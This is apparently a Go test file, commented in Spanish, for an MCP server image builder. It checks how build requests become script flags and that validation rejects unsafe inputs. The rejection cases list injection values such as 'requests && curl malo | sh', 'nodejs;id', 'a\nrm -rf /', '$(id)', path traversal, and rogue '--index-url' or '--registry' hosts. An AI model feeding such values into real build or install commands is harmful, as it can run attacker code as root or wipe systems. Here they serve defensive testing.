package mcp

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// buildScriptArgs traduce el request a los flags de 80-mcp-image.sh. El único
// matiz que importa por corrección: -bundle (y el resto de flags) va ANTES de `--`,
// porque parse_build_opts deja de leer flags al ver `--`.
func TestBuildScriptArgs(t *testing.T) {
	base := BuildRequest{
		Name: "svc", NPM: []string{"@scope/server"}, Packages: []string{"nodejs", "npm"},
		Cmd: []string{"server-bin", "--flag"},
	}

	// Sin bundle: no aparece -bundle.
	got := BuildScriptArgs(base)
	if idx := indexOf(got, "-bundle"); idx != -1 {
		t.Errorf("sin Bundle no debería haber -bundle: %v", got)
	}

	// Con bundle: aparece -bundle y ANTES del separador --.
	base.Bundle = true
	got = BuildScriptArgs(base)
	bi, sep := indexOf(got, "-bundle"), indexOf(got, "--")
	if bi == -1 {
		t.Fatalf("falta -bundle: %v", got)
	}
	if sep == -1 || bi > sep {
		t.Errorf("-bundle (%d) debe ir antes de -- (%d): %v", bi, sep, got)
	}
	// El comando del servidor queda después de --, intacto.
	if got[len(got)-2] != "server-bin" || got[len(got)-1] != "--flag" {
		t.Errorf("el comando no quedó tras --: %v", got)
	}
	// Modo siempre stdio y el nombre como segundo arg.
	if got[0] != "stdio" || got[1] != "svc" {
		t.Errorf("cabecera esperada [stdio svc], got %v", got[:2])
	}
}

// El caso Python del traductor: -P y -e también tienen que caer ANTES de `--`,
// y -e una vez POR variable — un valor puede llevar espacios, y unirlos con
// espacios como -p/-n/-P los partiría al llegar al array EXTRA_ENV del script.
func TestBuildScriptArgsPython(t *testing.T) {
	got := BuildScriptArgs(BuildRequest{
		Name:     "semgrep",
		Packages: []string{"python3", "py3-pip"},
		PIP:      []string{"semgrep-mcp==1.0.0"},
		Env:      []string{"SEMGREP_SEND_METRICS=off", "A=b c"},
		Cmd:      []string{"semgrep-mcp"},
	})
	sep := indexOf(got, "--")
	if sep == -1 {
		t.Fatalf("falta el separador --: %v", got)
	}
	pi := indexOf(got, "-P")
	if pi == -1 || pi > sep {
		t.Errorf("-P debe ir antes de -- : %v", got)
	}
	if pi != -1 && got[pi+1] != "semgrep-mcp==1.0.0" {
		t.Errorf("-P debe llevar el paquete pip: %v", got)
	}
	// Cada variable con su propio -e, valor intacto (espacios incluidos).
	var envs []string
	for i, a := range got[:sep] {
		if a == "-e" {
			envs = append(envs, got[i+1])
		}
	}
	if len(envs) != 2 || envs[0] != "SEMGREP_SEND_METRICS=off" || envs[1] != "A=b c" {
		t.Errorf("-e no conserva las variables una a una: %v", envs)
	}
}

// Todo flag que buildScriptArgs pueda emitir tiene que existir en el parser de
// 80-mcp-image.sh. Los dos extremos están en lenguajes distintos: añadir un
// flag aquí sin tocar el script no falla en compilación — falla en el daemon
// como "opción desconocida" a mitad de una construcción como root.
func TestBuildScriptEntiendeLosFlags(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("..", "..", "scripts", "80-mcp-image.sh"))
	if err != nil {
		t.Fatal(err)
	}
	s := string(b)
	for _, f := range []string{"-p)", "-n)", "-P)", "-e)", "-d)", "-bundle)"} {
		if !strings.Contains(s, f) {
			t.Errorf("80-mcp-image.sh no parsea %s, y buildScriptArgs puede emitirlo", strings.TrimSuffix(f, ")"))
		}
	}
	// Y las variables de -e tienen que escribirse en el entrypoint con %q: un
	// `echo "export $kv"` ejecutaría la mitad de un valor con espacios.
	if !strings.Contains(s, `printf 'export %s=%q\n'`) {
		t.Error("80-mcp-image.sh no cita los valores de -e (printf con formato q) en el entrypoint")
	}
}

// -bundle deja el servidor en /opt/<nombre>.bundle.mjs, y hay servidores que leen
// su versión del package.json EN TIEMPO DE EJECUCIÓN buscándolo junto al fichero
// que arranca (server-sequential-thinking: <dir>/package.json y <dir>/../package.json
// desde import.meta.url). Sin ese fichero en /opt el proceso muere al arrancar con
// "Could not locate package.json for server version" y el initialize responde 502.
// Construir la imagen exige root y un loopback, así que aquí solo se comprueba que
// la rama de -bundle sigue copiando el package.json al lado del bundle.
func TestBuildScriptBundleCopiaPackageJSON(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("..", "..", "scripts", "80-mcp-image.sh"))
	if err != nil {
		t.Fatal(err)
	}
	s := string(b)
	i := strings.Index(s, `--outfile=/opt/$NAME.bundle.mjs`)
	if i == -1 {
		t.Fatal("80-mcp-image.sh ya no escribe el bundle en /opt/$NAME.bundle.mjs; revisa este test y la copia del package.json")
	}
	// La copia va DESPUÉS de esbuild (para que npx no tome /opt por un proyecto) y
	// ANTES de que CMD pase a apuntar al bundle.
	j := strings.Index(s[i:], `CMD=(node "/opt/$NAME.bundle.mjs"`)
	if j == -1 {
		t.Fatal("80-mcp-image.sh ya no cambia CMD al bundle; revisa este test")
	}
	if !strings.Contains(s[i:i+j], `"$mnt/opt/package.json"`) {
		t.Error("la rama -bundle de 80-mcp-image.sh no copia el package.json del paquete a /opt/package.json: server-sequential-thinking morirá al arrancar")
	}
}

func indexOf(xs []string, s string) int {
	for i, x := range xs {
		if x == s {
			return i
		}
	}
	return -1
}

// validateBuild es lo único que separa el socket del daemon de un `apk add` y
// un `npm install -g` corriendo como root con argumentos ajenos. Los campos
// llegan a esos comandos SIN comillas dentro del script, y el nombre acaba
// siendo la ruta $ROOT/images/$NAME.ext4.
func TestValidateBuildRechaza(t *testing.T) {
	ok := BuildRequest{
		Name:     "files",
		Packages: []string{"nodejs", "npm"},
		NPM:      []string{"@modelcontextprotocol/server-filesystem@2025.8.21"},
		Cmd:      []string{"mcp-server-filesystem", "/data"},
	}
	if err := ValidateBuild(ok); err != nil {
		t.Fatalf("una petición legítima no debería fallar: %v", err)
	}

	cases := []struct {
		nombre string
		mutate func(*BuildRequest)
	}{
		// El nombre es un componente de ruta.
		{"nombre con barra", func(r *BuildRequest) { r.Name = "a/b" }},
		{"nombre con travesía", func(r *BuildRequest) { r.Name = "../../etc/passwd" }},
		{"nombre vacío", func(r *BuildRequest) { r.Name = "" }},
		{"nombre con espacio", func(r *BuildRequest) { r.Name = "mi servicio" }},
		{"nombre con punto y coma", func(r *BuildRequest) { r.Name = "a;rm" }},
		{"nombre demasiado largo", func(r *BuildRequest) { r.Name = strings.Repeat("a", 65) }},
		{"base con travesía", func(r *BuildRequest) { r.Base = "../min" }},

		// apk y npm reciben estos valores sin comillas: inyección de argumentos.
		{"apk con espacio", func(r *BuildRequest) { r.Packages = []string{"nodejs npm"} }},
		{"apk como opción", func(r *BuildRequest) { r.Packages = []string{"--allow-untrusted"} }},
		{"apk con punto y coma", func(r *BuildRequest) { r.Packages = []string{"nodejs;id"} }},
		{"npm como opción", func(r *BuildRequest) { r.NPM = []string{"--registry=http://malo"} }},
		{"npm con espacio", func(r *BuildRequest) { r.NPM = []string{"uno dos"} }},
		{"npm con ruta", func(r *BuildRequest) { r.NPM = []string{"../../tmp/x"} }},

		// El comando se escribe en el entrypoint generado, una línea.
		{"comando vacío", func(r *BuildRequest) { r.Cmd = nil }},
		{"comando con salto de línea", func(r *BuildRequest) { r.Cmd = []string{"sh", "a\nrm -rf /"} }},
		{"comando con byte nulo", func(r *BuildRequest) { r.Cmd = []string{"sh", "a\x00b"} }},

		{"crecimiento negativo", func(r *BuildRequest) { r.GrowMB = -1 }},
		{"crecimiento absurdo", func(r *BuildRequest) { r.GrowMB = 1 << 20 }},

		// Las variables de entorno acaban en el entrypoint generado. La clave
		// tiene que ser un identificador de shell; el valor, una sola línea.
		{"env sin igual", func(r *BuildRequest) { r.Env = []string{"SOLO_CLAVE"} }},
		{"env con clave vacía", func(r *BuildRequest) { r.Env = []string{"=valor"} }},
		{"env con clave con espacio", func(r *BuildRequest) { r.Env = []string{"A B=c"} }},
		{"env con clave que empieza por dígito", func(r *BuildRequest) { r.Env = []string{"1A=b"} }},
		{"env con salto de línea", func(r *BuildRequest) { r.Env = []string{"A=b\nrm -rf /"} }},
		{"env con byte nulo", func(r *BuildRequest) { r.Env = []string{"A=b\x00c"} }},
	}

	for _, c := range cases {
		t.Run(c.nombre, func(t *testing.T) {
			r := ok
			c.mutate(&r)
			if err := ValidateBuild(r); err == nil {
				t.Errorf("debería rechazarlo: %+v", r)
			}
		})
	}
}

func TestValidateBuildAcepta(t *testing.T) {
	cases := []BuildRequest{
		{Name: "eco", Cmd: []string{"/opt/mcp/server"}},
		{Name: "files-2", Base: "min", Packages: []string{"nodejs", "npm", "py3-pip"},
			NPM: []string{"@scope/pkg", "otro@1.2.3"}, Cmd: []string{"bin", "--flag", "valor con espacios"}},
		{Name: "a", Cmd: []string{"x"}, GrowMB: 8192},
		// El caso que motivó Env: apagar el phone-home de semgrep. El valor
		// admite espacios y símbolos; el script lo cita con %q en el entrypoint.
		{Name: "semgrep", Base: "python", Packages: []string{"python3", "py3-pip"},
			PIP: []string{"semgrep-mcp"}, Cmd: []string{"semgrep-mcp"},
			Env: []string{"SEMGREP_SEND_METRICS=off", "SEMGREP_ENABLE_VERSION_CHECK=0", "X=a b;c", "VACIA="}},
	}
	for _, r := range cases {
		if err := ValidateBuild(r); err != nil {
			t.Errorf("%q debería valer: %v", r.Name, err)
		}
	}
}

// Los nombres de paquetes de pip acaban en `pip install $PIP` SIN comillas
// dentro del script, igual que los de apk y npm.
//
// Ahí, un valor que empieza por guion no es un paquete: es un flag. Y
// `--index-url` apuntando a otro sitio convierte una instalación en la
// ejecución de código de quien controle ese índice.
func TestNombresDePipQueNoDebenColar(t *testing.T) {
	malos := []string{
		"--index-url=http://malo", // cambia de dónde se descarga
		"-e",                      // instalación editable desde una ruta
		"requests; rm -rf /",      // separador de comandos
		"requests && curl malo | sh",
		"req uests", // el espacio parte el argumento
		"../../etc/passwd",
		"",
		"paquete$(id)",
		"paquete`id`",
	}
	for _, p := range malos {
		if err := ValidateBuild(BuildRequest{
			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
		}); err == nil {
			t.Errorf("aceptó el paquete pip %q", p)
		}
	}

	// Y los que sí son legítimos, con sus especificadores de versión.
	buenos := []string{"requests", "semgrep", "python-lsp-server",
		"requests==2.31.0", "flask>=2.0", "numpy~=1.26.0", "urllib3!=2.0.0"}
	for _, p := range buenos {
		if err := ValidateBuild(BuildRequest{
			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
		}); err != nil {
			t.Errorf("rechazó el paquete pip legítimo %q: %v", p, err)
		}
	}
}

// TestHandleImages cubre GET /images: enumera los .ext4 (menos overlay-template),
// marca cuáles tienen receta y cuenta los snapshots dorados que salen de cada
// imagen (el dato que dice cuál se puede retirar sin dejar servicios sin base).
